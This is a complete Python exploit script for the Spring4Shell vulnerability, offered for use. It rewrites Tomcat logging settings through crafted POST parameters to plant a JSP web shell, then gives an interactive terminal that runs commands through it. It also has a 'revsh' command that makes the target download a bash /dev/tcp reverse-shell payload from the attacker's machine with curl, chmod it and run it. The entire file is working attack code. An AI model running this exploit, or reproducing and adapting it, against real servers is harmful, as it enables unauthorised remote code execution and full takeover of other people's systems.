#!/usr/bin/env python3
"""
Simple script to exploit spring4shell easily.
Original exploit: @Rezn0k - Based off the work of p1n93r
"""
import os
import secrets
import shutil
import sys
import threading
import time
from cmd import Cmd
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

rev_shell_payload = "bash -i >& /dev/tcp/{ip}/{port} 0>&1"
proxies = {
    # "http": "http://localhost:8080",
    # "https": "http://localhost:8080"
}


def get_host(url, with_scheme=False):
    uri = urlparse(url)
    return f"{uri.scheme}://{uri.netloc}" if with_scheme else uri.netloc


def start_server(httpd):
    httpd.serve_forever()


def stop_server(httpd):
    httpd.shutdown()  # Hackish way to terminate the thread


class Term(Cmd):
    def __init__(self, shell, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.prompt = f"spring4shell@{get_host(shell)} ~ # "
        self.shell = shell

    def default(self, args):
        args = args.strip()
        if args == "exit":
            exit()
        elif args.startswith("revsh"):
            try:
                _, ip, port = args.split(" ")
                self.get_rev_shell(ip, port)
            except ValueError:
                print("[-] Invalid revsh command! Usage: revsh <your-ip> <your-port>")
            return
        elif not args:
            return
        sploit = requests.get(f"{self.shell}?cmd={args}", verify=False, proxies=proxies)
        if sploit.status_code == 404:
            print("[!] Something went wrong. The exploit may not work as expected")
        res = filter(None, sploit.text.split("\n"))
        print("\n".join(list(res)[:-1]))  # Delete the //

    def do_quit(self, args):
        return 0

    def get_rev_shell(self, ip, port):
        print("[!] Getting a reverse shell")
        sh_name = f"/tmp/{secrets.token_hex(8)}.sh"
        print("[*] Creating a temporary folder and file to push the reverse shell")
        rev_shell_code = rev_shell_payload.format(ip=ip, port=port)
        tmp_dir = secrets.token_hex(8)
        if not os.path.isdir(tmp_dir):
            os.mkdir(tmp_dir)
        os.chdir(tmp_dir)
        file_name = secrets.token_hex(8)
        with open(file_name, "w") as shout:
            shout.write(rev_shell_code)

        sh_port = int(port) - 1
        print(f"[*] Starting server")
        httpd = HTTPServer(("0.0.0.0", sh_port), SimpleHTTPRequestHandler)
        server = threading.Thread(name='python httpd server', target=start_server, args=(httpd,))
        server.start()
        time.sleep(1)
        print("[*] Grabbing the reverse shell")
        curl_command = f"curl -o {sh_name} http://{ip}:{sh_port}/{file_name}"
        sploit = requests.get(f"{self.shell}?cmd={curl_command}", verify=False, proxies=proxies)
        time.sleep(1)
        print("[*] Tearing down local HTTP server and clearing directory")
        stop_server(httpd)
        os.chdir("..")
        shutil.rmtree(tmp_dir, ignore_errors=False)
        if sploit.status_code != 200:
            print("[-] Cannot load reverse shell payload. Retry manually")
            return

        print("[+] Reverse shell loaded")
        print("[*] Giving exec permission")
        requests.get(f"{self.shell}?cmd=chmod +x {sh_name}", verify=False, proxies=proxies)
        print("[*] Trying to trigger reverse shell")
        print(f"\tnc -lvnp {port}")
        input("[!] Start your listener then press ENTER")
        print("[*] Triggering the reverse shell")
        print(f"[!!] If the process hang is a good sign.")
        requests.get(f"{self.shell}?cmd=bash {sh_name}", verify=False, proxies=proxies)
        print("[*] If you read this check your listener. The reverse shell may not have worked...")


def run_exploit(url):
    directory = "webapps/ROOT"
    filename = secrets.token_hex(16)
    post_headers = {"Content-Type": "application/x-www-form-urlencoded"}
    get_headers = {"prefix": "<%", "suffix": "%>//", "c": "Runtime"}

    log_pattern = ("class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20"
                   "java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22))"
                   ".getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B"
                   "%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di")

    log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory={directory}"
    log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}"
    log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    exp_data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])
    # Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times
    # If re-running the exploit, this will create an artifact of {old_file_name}_.jsp
    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"

    print("[*] Resetting Log Variables")
    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False, proxies=proxies)
    if ret.status_code != 200:
        print(f"[!] Cannot reset log variables [{ret.status_code}]. Endpoint might not be vulnerable")
    # Change the tomcat log location variables
    print("[*] Modifying Log Configurations")
    ret = requests.post(url, headers=post_headers, data=exp_data, verify=False, proxies=proxies)
    if ret.status_code != 200:
        print(f"[-] Exploit failed [{ret.status_code}]. Cannot modify log configuration")
        sys.exit(1)
    # Changes take some time to populate on tomcat
    time.sleep(3)
    # Send the packet that writes the web shell
    requests.get(url, headers=get_headers, verify=False, proxies=proxies)
    time.sleep(1)
    # Reset the pattern to prevent future writes into the file
    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
    print("[*] Resetting Log Variables")
    requests.post(url, headers=post_headers, data=pattern_data, verify=False, proxies=proxies)
    time.sleep(5)  # Sometimes it takes a while to complete the exploit
    return f"{get_host(url, with_scheme=True)}/{filename}.jsp"


def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <scheme://host:port/endpoint>")
        sys.exit(-1)

    host = sys.argv[1].rstrip("/")
    print(f"""                _               ___     _          _ _ 
               (_)             /   |   | |        | | |
 ___ _ __  _ __ _ _ __   __ _ / /| |___| |__   ___| | |
/ __| '_ \\| '__| | '_ \\ / _` / /_| / __| '_ \\ / _ \\ | |
\\__ \\ |_) | |  | | | | | (_| \\___  \\__ \\ | | |  __/ | |
|___/ .__/|_|  |_|_| |_|\\__, |   |_/___/_| |_|\\___|_|_|
    | |                  __/ |                         
    |_|                 |___/\n""")

    print("[*] Running exploit")
    shell = run_exploit(host)
    print(f"[+] Exploit completed ({shell})")
    print("[*] Starting the virtual webshell")
    time.sleep(1)  # Suspense :D
    print("[!] To get a reverse shell run 'revsh <your-ip> <your-port>'")
    term = Term(shell)
    term.cmdloop()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception:
        raise
